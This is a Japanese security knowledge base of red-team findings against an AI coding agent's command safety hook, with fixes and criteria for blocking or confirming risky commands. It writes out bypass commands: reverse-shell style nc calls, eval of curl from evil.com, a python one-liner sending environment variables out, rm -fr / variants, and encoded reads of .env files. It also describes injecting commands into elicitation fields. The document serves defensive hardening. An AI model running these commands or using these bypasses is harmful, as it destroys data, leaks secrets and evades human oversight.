## 第1部: 失敗パターン（脆弱性・見落とし）

### SEC-FP-001: rm フラグ順序バイパス

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 CRIT-1
- **何が起きたか**: `rm -rf /` は BLOCK されるが `rm -fr /`（フラグ逆順）・`rm --force --recursive ~/`（ロングオプション）・`rm -rf/`（スペースなし）が Safety Gate を素通り。OS レベルの破壊操作が自動実行可能だった
- **根本原因**:
  - 正規表現 `/rm\s+-rf\s+[\/~]/i` がフラグ順序 `-rf` を前提とした固定パターン
  - `-fr`・`--force --recursive` などの等価表現を未検証
  - スペースなし記法（`-rf/etc`）の境界条件未考慮
- **教訓**:
  - 破壊的コマンドのフラグは「意味」で検出する（`\brm\b` + 破壊的フラグ有無 + ルート/ホームターゲット有無の3条件分離）
  - 正規表現1本で全変形を捕捉しようとしない。関数ベームのテストが安全
  - シェルの等価表現（ショート/ロングオプション）を網羅的にリストアップしてからパターン設計する
- **検出トリガー**: rm 系コマンドで `/`・`~` をターゲットにしているが BLOCK されない場合
- **推奨アクション**: 関数ベーステスト（`hasDestructiveFlag && targetsRoot`）に切り替え。ユニットテストで全フラグ変形を回帰テストとして登録

### SEC-FP-002: .env バリアントのアンカーバイパス

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 CRIT-2
- **何が起きたか**: `git add .env` は BLOCK されるが `git add .env.production`・`git add .env.local`・`git add .envrc` が素通り。本番シークレットが含まれるファイルのステージングを防止できなかった
- **根本原因**:
  - 正規表現 `/git\s+add\s+.*\.env(?:\s|$)/i` が末尾に `(?:\s|$)` アンカーを持ち `.env.production` にマッチしない
  - `.env` を「ファイル名」として認識しており、「`.env` で始まるすべてのファイル」として設計していなかった
- **教訓**:
  - シークレットファイルの保護パターンは拡張子ではなくプレフィックスで設計する
  - 末尾アンカーは「完全一致」を強制するため、バリアント検出には使ってはならない
  - `.env*` 全体を保護対象とする（`.envrc`・`.env.test`・`.env.example` も対象外にしない）
- **検出トリガー**: `.env.production`・`.env.local`・`.envrc` を含むリポジトリで `git add .env.xxx` がブロックされない
- **推奨アクション**: アンカー除去 → `/git\s+add\s+.*\.env/i`。`.env` という文字列を含むすべてのパスをブロック対象とする

### SEC-FP-003: git add -A/./* による一括ステージング未検知

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 CRIT-3
- **何が起きたか**: `git add .env.production` は BLOCK されるが `git add -A`・`git add .`・`git add *` は MEDIUM として ask_user にもなっておらず素通り。`.env` を含む全ファイルが無音でステージングされる可能性
- **根本原因**:
  - 一括ステージングコマンドが HIGH_RISK_PATTERNS にリストアップされていなかった
  - 個別ファイル指定の危険パターンは考慮されていたが、ワイルドカード形式が抜け落ちていた
- **教訓**:
  - 一括操作は必ずワイルドカード形式を含めて HIGH 以上に分類する
  - `git add -A`・`git add .`・`git add *` は「`.env` が含まれる可能性がある」として HIGH リスク
  - 個別ファイルより一括操作の方が影響範囲が広い
- **検出トリガー**: `git add -A` または `git add .` が実行されようとする場面
- **推奨アクション**: HIGH_RISK_PATTERNS に追加。ask_user で「大量ステージング（.env が含まれる可能性）」を警告表示

### SEC-FP-004: nc フルパス・シェルラッパー経由バイパス

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 HIGH-2
- **何が起きたか**: `nc attacker.com 4444` はブロックされるが `/usr/bin/nc attacker.com`・`bash -c "nc attacker.com 4444"` が素通り。生ソケット通信によるデータ外部送信を防止できなかった
- **根本原因**:
  - 正規表現 `^(nc|ncat|netcat|telnet)\s` がコマンド先頭アンカーのみ考慮
  - フルパス（`/usr/bin/nc`）でのコマンド実行を未考慮
  - シェルラッパー（`bash -c "nc ..."`）経由での迂回を未考慮
- **教訓**:
  - ネットワーク系コマンドは先頭アンカーではなく区切り文字ベースで検出する（`[|;&\s]` の後に続くパターン）
  - フルパス実行（`/usr/bin/nc`）は `(?:(?:\/[^\s|;&`]*\/)?)` で吸収
  - シェルラッパー（`bash -c`・`sh -c`）は別パターンで補完
- **検出トリガー**: フルパスまたはシェルラッパー経由の nc/ncat/telnet 実行
- **推奨アクション**: 区切り文字ベースパターン + フルパス対応 + シェルラッパー補完の3パターン組み合わせ

### SEC-FP-005: sudo osascript/security バイパス

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 HIGH-3
- **何が起きたか**: `osascript -e "..."` はブロックされるが `sudo osascript -e "..."`・`sudo security find-internet-password` が素通り。sudo プレフィックス付きの macOS キーチェーン操作を防止できなかった
- **根本原因**:
  - 正規表現 `^(osascript|security ...)` がコマンド先頭アンカーのみ考慮
  - `sudo` プレフィックスがある場合の変形を未考慮
- **教訓**:
  - `sudo` コマンドは deny リストで一括ブロックされているが、Safety Gate パターンでも `sudo` + 危険コマンドの組み合わせを明示的に検出する（deny バイパスがあった場合のフォールバック）
  - `(?:^|sudo\s+)` プレフィックスパターンを危険コマンド検出に標準化する
- **検出トリガー**: `sudo osascript`・`sudo security` の組み合わせ
- **推奨アクション**: `^` を `(?:^|sudo\s+)` に変更。安全チェックはレイヤーを重ねる

### SEC-FP-006: eval + curl によるリモートコード実行の未検知

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 HIGH-4
- **何が起きたか**: `eval "$(curl http://evil.com/payload)"` が Safety Gate を素通り。外部URLからコードをダウンロードして実行するサプライチェーン攻撃パターンが未検知
- **根本原因**:
  - `curl|bash` パターン（SEC-013）は既知だったが `eval "$(curl ...)"` 形式が別パターン
  - コマンド置換（`$()`）と eval の組み合わせが抜け落ちていた
- **教訓**:
  - リモートコード実行パターンは複数形式がある: `curl|bash`・`bash <(curl ...)`・`eval "$(curl ...)"`
  - `eval` + 外部コード取得の組み合わせは常に BLOCK 対象
  - サプライチェーン攻撃パターンは定期的に新形式が出現する。継続的な更新が必要
- **検出トリガー**: `eval` と `curl`/`wget` が同一コマンドに出現
- **推奨アクション**: SG-011 として Safety Gate に追加。`eval\s+["'`]?\$\((?:curl|wget)/` パターン

### SEC-FP-007: .env エクスフィルトレーション迂回路未検知

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 HIGH-5
- **何が起きたか**: `cat .env` は denyRead でブロックされるが `cp .env /tmp/leaked`・`base64 .env`・`xxd .env`・`od .env` が素通り。エンコーディングやコピー経由でシークレットが漏洩する迂回路が存在
- **根本原因**:
  - 直接読み取り（`cat .env`・`Read(.env)`）は対策済みだが、間接アクセスパターンが未考慮
  - `base64`・`xxd`・`od` をバイナリダンプツールとして認識しておらず、シークレット漏洩に使われることを想定していなかった
- **教訓**:
  - シークレット保護は「読む」だけでなく「コピー」「移動」「エンコード」「ダンプ」すべての経路をカバーする
  - `cp/mv/ln .env*` → 場所を変えてからアクセス
  - `base64/xxd/od/strings/hexdump .env` → エンコード経由で内容取得
  - これらは HIGH（ask_user）として扱い、ユーザーに確認を求める
- **検出トリガー**: コピー/移動/エンコードツールと `.env` ファイルの組み合わせ
- **推奨アクション**: HIGH_RISK_PATTERNS に `cp/mv/ln .env*` と `base64/xxd/od/strings .env` を追加

### SEC-FP-008: Elicitation フィールドの部分スキャン

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 HIGH-6
- **何が起きたか**: Elicitation ペイロードの `prompt`・`message`・`content` フィールドをスキャンしていたが、`title`・`description`・`properties` 等の UI フィールドへのインジェクション埋め込みが検知されない
- **根本原因**:
  - `data.prompt || data.message || data.content || JSON.stringify(data)` という OR チェーンで、前のフィールドが存在する場合は `JSON.stringify` フォールバックが実行されない
  - 攻撃者は `prompt` フィールドに無害な内容を入れ、`title` や `description` に悪意あるコマンドを埋め込むことができた
- **教訓**:
  - OR チェーンによる「フォールバック」は最後のフォールバックが「他のフィールドが存在すると実行されない」という罠がある
  - セキュリティスキャンは AND（全フィールド）で行う。OR（最初に見つかったフィールド）ではない
  - `JSON.stringify(data)` は常に実行してすべてのフィールドを結合する
- **検出トリガー**: `title` や `description` フィールドにコマンド指示が埋め込まれた Elicitation
- **推奨アクション**: OR チェーンを配列結合に変更 → `[data.prompt, data.message, data.content, data.title, data.description, JSON.stringify(data)].filter(Boolean).join(' ')`

### SEC-FP-009: base64 短ペイロード閾値の設定ミス

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 HIGH-7
- **何が起きたか**: base64 デコード後に危険コマンドを含む文字列の検出閾値が `{40,}` 文字だった。`rm -rf /`（8文字、base64: 約12文字）・`curl http://evil.com`（20文字、base64: 約28文字）等の短い危険コマンドが検知されない
- **根本原因**:
  - 閾値40文字は「十分な長さのエンコードされた文字列」を想定して設定されたが、短い危険コマンドの base64 表現が閾値を下回る
  - 閾値設計時に最短の危険コマンド（`rm -rf /` = 8文字）で検証していなかった
- **教訓**:
  - base64 閾値は「最も短い危険コマンドの base64 表現」以下に設定する
  - `rm -rf /` の base64 = 約12文字 → 閾値は12以下
  - 偽陽性（誤検知）防止のため閾値20文字に設定（`curl http://evil.com` が約28文字なので確実に検知）
  - 閾値変更後は短ペイロードの回帰テストを必須化する
- **検出トリガー**: 短い base64 文字列（20〜40文字）がデコード後に危険コマンドを含む
- **推奨アクション**: `{40,}` → `{20,}` に変更。最短危険コマンドの base64 長を単体テストで回帰テスト登録

### SEC-FP-010: git stash ワイルドカードによる破壊的操作の許容

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 MED-1
- **何が起きたか**: `settings.json` の allow リストに `"Bash(git stash *)"` があり、`git stash drop`・`git stash clear`（スタッシュを不可逆削除する操作）が自動承認される状態だった
- **根本原因**:
  - ワイルドカード `*` による一括 allow は安全な操作と危険な操作を区別しない
  - `git stash push/pop/apply/show/list` は安全だが `drop/clear` は不可逆
  - 最小権限原則（ワイルドカードを避け必要なサブコマンドのみ列挙）が適用されていなかった
- **教訓**:
  - allow リストのワイルドカードは最小権限違反。サブコマンドを個別列挙する
  - 「大体安全」なコマンドグループでも、不可逆なサブコマンドは deny 対象にする
  - `git stash *` ではなく `git stash list`・`git stash show *`・`git stash push *`・`git stash pop *`・`git stash apply *` の5コマンド個別列挙
- **検出トリガー**: allow リストに `*` ワイルドカードを含むエントリが存在する
- **推奨アクション**: `/permissions` で定期棚卸し。ワイルドカード allow を全廃し個別列挙に置き換える

### SEC-FP-011: docker prune の HIGH 分類漏れ

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 MED-2
- **何が起きたか**: `docker system prune`・`docker volume prune` が MEDIUM（説明表示のみ）として扱われていた。これらのコマンドはコンテナ・ボリューム・ネットワークを不可逆削除する破壊的操作
- **根本原因**:
  - `docker rm -f` は HIGH に分類されていたが、`docker prune` 系コマンドの破壊性が過小評価
  - `prune` というコマンド名が「軽微な整理」に見え、実際の影響範囲（全未使用リソース削除）を認識していなかった
- **教訓**:
  - コマンド名の印象で分類するな。実際の影響範囲（削除されるリソースの範囲）で分類する
  - `docker system prune` は全コンテナ・全イメージ・全ボリューム・全ネットワークを一括削除。明らかに HIGH
  - `docker container/volume/network/image prune` も同様に HIGH
- **検出トリガー**: `docker prune` 系コマンドが MEDIUM または LOW で通過する
- **推奨アクション**: `/docker\s+(?:system|volume|network|container|image)\s+prune/` を HIGH_RISK_PATTERNS に追加

### SEC-FP-012: 無限ループパターンの不完全な検出

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 MED-3
- **何が起きたか**: `while true` は BLOCK されるが `while :`・`while [ 1 -eq 1 ]`・`for ((;;))` が素通り。コスト暴走を引き起こす無限ループの変形が未検知
- **根本原因**:
  - `while true` のみを検知するシンプルなパターン。シェルスクリプトの等価表現を網羅していなかった
  - `:` は bash の no-op コマンドで `true` と等価。`while :` は `while true` と同じ動作
  - bash の算術ループ `for ((;;))` を考慮していなかった
- **教訓**:
  - 無限ループの全形式を列挙してテストする: `while true`・`while :`・`while [ 1 -eq 1 ]`・`while [ true ]`・`for ((;;))`・大きな seq を使った for ループ
  - シェルの等価表現は思ったより多い。リファレンスを参照して網羅する
- **検出トリガー**: `while :` や `for ((;;))` が BLOCK されない
- **推奨アクション**: パターンを `while\s+(?:true|:|\[\s*1\s*-eq\s*1\s*\]|\[\s*true\s*\])/i` に拡張 + `for\s*\(\s*\(` パターン追加

### SEC-FP-013: chmod バリアントの未検知

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 MED-4
- **何が起きたか**: `chmod 777` は HIGH だが `chmod 0777`・`chmod a+rwx`・`chmod ugo+rwx` が素通り。全パーミッション付与の等価表現が未検知
- **根本原因**:
  - `777` のみを数値形式として検知。`0777`（8進数プレフィックス）と記号形式（`a+rwx`・`ugo+rwx`）を未考慮
- **教訓**:
  - パーミッション設定は数値形式と記号形式の両方が存在する。どちらも同じ意味で同じリスク
  - `0777` は `777` の8進数表記。`a+rwx` は all users + read/write/execute
  - 等価表現を全て列挙してパターンに含める
- **検出トリガー**: `chmod 0777`・`chmod a+rwx` が HIGH で検知されない
- **推奨アクション**: `/chmod\s+(?:0*777|a[+]rwx|ugo[+]rwx)/` に拡張

### SEC-FP-014: --force-with-lease の誤検知（偽陽性）

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 MED-5
- **何が起きたか**: `git push --force` を HIGH として検知するパターンが `git push --force-with-lease` にもマッチし、安全な代替操作が誤って HIGH 扱いになっていた
- **根本原因**:
  - パターン `/git\s+push\s+.*--force/` が `--force` で始まる文字列に全てマッチ
  - `--force-with-lease` は「リモートに自分が知らないコミットがあれば自動失敗する」安全機構を持ち、`--force` とは本質的に異なる
- **教訓**:
  - セキュリティパターンの偽陽性は「安全な操作を妨害する」という形でセキュリティ文化を損なう
  - 開発者が安全な代替手段（`--force-with-lease`）を使うことを妨げてはならない
  - 否定先読み `(?!-with-lease)` でプレフィックス一致による誤検知を防止
- **検出トリガー**: `git push --force-with-lease` が HIGH として扱われる
- **推奨アクション**: `--force(?!-with-lease)` の否定先読みパターンを採用

### SEC-FP-015: インラインコードによる環境変数漏洩バイパス

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 MED-6
- **何が起きたか**: `curl *`・`wget *` が deny されているが、`python3 -c 'import requests; r=requests.get("http://evil.com", data=os.environ)'` が Safety Gate を素通り。deny をインタープリタのインラインコード実行で迂回される
- **根本原因**:
  - `python3 -c`・`node -e` でインラインコードを実行することで、deny リストのコマンドを直接呼ばずに同等の操作が可能
  - インタープリタのネットワーク API（`requests`・`http`・`fetch`）がブロック対象になっていなかった
  - `os.environ`・`process.env` の読み取り＋ネットワーク送信の組み合わせが未検知
- **教訓**:
  - deny リストは OS コマンドレベルのブロック。インタープリタレベルのバイパスには別途 Safety Gate パターンが必要
  - `python3 -c` + ネットワーク API または環境変数アクセスを組み合わせた場合は BLOCK
  - `python3 -c *`・`node -e *` は deny リストにも入れ二重防御する
- **検出トリガー**: `python3 -c` や `node -e` に `requests`・`urllib`・`os.environ`・`process.env` が含まれる
- **推奨アクション**: Safety Gate に python3/node のネットワーク・環境変数アクセスパターンを追加

### SEC-FP-016: post-tool-use.js のログ書き込み失敗による停止

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 MED-7
- **何が起きたか**: `.context/` ディレクトリへの書き込み権限がない場合、`post-tool-use.js` が例外で終了し stdout に何も出力しない。Claude Code のフックフレームワークは空の stdout を「エラー」として扱い、ツール実行がスタールする可能性があった
- **根本原因**:
  - ファイルシステム操作（`mkdirSync`・`appendFileSync`）を try/catch なしで実行
  - ログ書き込み失敗は「非致命的エラー」だが例外が主処理を停止させていた
  - `console.log(JSON.stringify({ continue: true }))` が到達されない場合があった
- **教訓**:
  - フックの主役は「決定の出力（stdout）」。ログ記録は副次的処理
  - ファイルシステム操作は必ず try/catch で包み、失敗しても stdout 出力は保証する
  - 「ログが書けなくても処理を継続する」という設計原則を守る（ロギングより可用性が優先）
- **検出トリガー**: `.context/` が書き込み不可な環境でフックが無応答になる
- **推奨アクション**: ファイルシステム操作全体を try/catch で囲む。`catch (_writeErr) { /* non-critical */ }` の後に必ず `console.log({ continue: true })`

### SEC-FP-017: dotenv + console.log の偽陽性

- **発生**: 2026-03-20 / commit `992cf9b` / レッドチーム監査 LOW-1
- **何が起きたか**: `echo "load_dotenv is a function, use console.log to debug"` という文字列が Safety Gate の「dotenv + print パターン」にマッチして BLOCK される。正当な echo 文が誤ってブロックされる偽陽性
- **根本原因**:
  - `load_dotenv` と `console.log` というサブ文字列を独立して検索するパターンが、echo 文字列リテラルにもマッチ
  - コンテキスト（実際のインラインコード実行か、単なる文字列か）を区別していなかった
- **教訓**:
  - シークレット漏洩パターンは「実際に実行されるコード」にのみ適用する
  - `python3 -c '...'` や `node -e '...'` という「インラインコード実行」の文脈でのみ検知する
  - echo や printf の文字列リテラルは安全（変数展開なしの文字列はシークレットを含まない）
- **検出トリガー**: dotenv・console.log 等のキーワードを含む echo/printf 文が BLOCK される
- **推奨アクション**: `python3\s+-c|node\s+-e` のプレフィックス条件を追加して、インラインコード文脈のみを検知対象にする

## 第3部: 判断基準

### SEC-JC-001: BLOCK vs ask_user（HIGH）の使い分け

**基本原則**: BLOCK は「ユーザー承認があっても実行させない」操作のみ。HIGH は「ユーザーが意図して実行することもある」操作

| 条件 | 判定 |
|------|------|
| **BLOCK** | 被害が壊滅的かつ不可逆（ルート削除・DB破壊・シークレット外部送信・リモートコード実行）|
| **HIGH → ask_user** | 破壊的だがユーザーが意図して実行する場面がある（git push --force、DROP TABLE等）|
| **例外** | 組織のポリシーで明示的に禁止されている操作は ask_user ではなく BLOCK にすることも可 |

- **過去事例**: `git push --force` は HIGH（意図した force push は存在する）。`rm -rf /` は BLOCK（意図した実行は存在しない）。`curl|bash` は BLOCK（外部スクリプトの直接実行は意図しない）
- **最終優先ルール**: 「ユーザーが承認を求められてどうするか」をイメージする。「もちろんYES」という場面が実務で存在するなら HIGH。存在しないなら BLOCK
- **出自**: [確定] レッドチーム監査後の設計レビューから確立（2026-03-20）

---

### SEC-JC-002: 偽陽性（誤検知）vs 偽陰性（見落とし）のトレードオフ

**基本原則**: セキュリティ Hook の偽陽性は「開発者を止める」という形でセキュリティ文化を損なう。偽陰性は実害を生む。最適点は「偽陽性最小化 + 偽陰性ゼロ」

| 条件 | 判定 |
|------|------|
| **偽陽性を優先して除去** | BLOCK パターンで正当な開発操作（`--force-with-lease`等）がブロックされる場合 |
| **偽陰性を優先して防止** | Safety Gate パターンで壊滅的被害（ルート削除・シークレット漏洩）が抜ける場合 |
| **例外** | HIGH（ask_user）での偽陽性は確認ダイアログが出るだけなので許容度が高い |

- **過去事例**: `--force-with-lease` 偽陽性（SEC-FP-014）— 偽陽性を除去するために否定先読みを追加。base64 閾値（SEC-FP-009）— 偽陰性を防ぐために閾値を下げた
- **最終優先ルール**: BLOCK パターンの偽陽性はゼロにする。HIGH パターンの偽陽性は許容する。偽陰性は全パターンでゼロにする
- **出自**: [確定] レッドチーム監査（2026-03-20）

### SEC-JC-003: 個人情報の Claude Code 入力可否

**基本原則**: Claude Code への入力は「第三者提供」に該当する可能性がある（改正個人情報保護法）。判断基準は「データ種別」と「マスキング状況」

| 条件 | 判定 |
|------|------|
| **YES（入力可）** | ダミーデータ・マスキング済みデータ・匿名化済みデータ |
| **NO（入力不可）** | 採用候補者の個人情報・本番DB接続文字列・未公開財務数値・顧客個人情報 |
| **例外** | Team/Enterprise プランを使用し、データ処理契約（DPA）を締結している場合は別途検討 |

- **過去事例**: Mikiwame の採用候補者適性診断データ — 改正個人情報保護法上の要配慮個人情報に該当するため入力禁止と判断（2026-03-21）
- **最終優先ルール**: 疑わしい場合はマスキングして入力する。「多分大丈夫」で入力しない
- **出自**: [確定] データ保護実装（2026-03-21）+ 個人情報保護法解釈

### SEC-JC-004: セキュリティ Hook パターンの更新頻度

**基本原則**: 攻撃パターンは進化する。セキュリティパターンは「実装したら終わり」ではなく継続的に更新する

| 条件 | 判定 |
|------|------|
| **即時更新** | 新しいバイパス手法が発見された・CVE が公開された・レッドチーム監査で脆弱性が見つかった |
| **定期更新** | 四半期ごとにパターンの網羅性レビュー + テスト実行 |
| **トリガー更新** | Claude Code のバージョンアップで新機能追加時（新しい攻撃面が生まれる可能性）|

- **過去事例**: 2026-03-20 レッドチーム監査で14件発見 → 即時修正。当初パターンは「最初の実装」として問題なかったが、未検証の等価表現が多数存在した
- **最終優先ルール**: パターンを追加するたびに回帰テストを書く。テストが失敗したら優先度1で修正
- **出自**: [確定] レッドチーム監査後の設計レビュー（2026-03-20）

### SEC-JC-005: permissions.deny vs Safety Gate パターンの使い分け

**基本原則**: deny は「シンプルな文字列マッチ」。Safety Gate は「複雑な条件・コンテキスト判断」が必要な場合

| 条件 | 判定 |
|------|------|
| **permissions.deny を使う** | コマンド名が明確に危険（`sudo *`・`curl *`・`rm -rf /`）かつ正当な使用ケースがない |
| **Safety Gate を使う** | 条件付きで危険（本番DB接続文字列のみブロック・フラグ組み合わせ依存の判断）|
| **両方使う** | deny で第1防衛、Safety Gate で deny バイパスを防ぐ二重防衛 |

- **過去事例**: `curl *` → deny リストに追加（正当な curl は allowList で個別に許可する設計）。本番DB接続文字列 → Safety Gate（localhost は許可、非localhost はブロックという条件が必要）
- **最終優先ルール**: deny は「コマンド名の一致」、Safety Gate は「コマンドの内容・コンテキスト」。シンプルならdeny、複雑ならSafety Gate
- **出自**: [抽出] settings.json + tool-risk.js の設計から（2026-03-20/21）
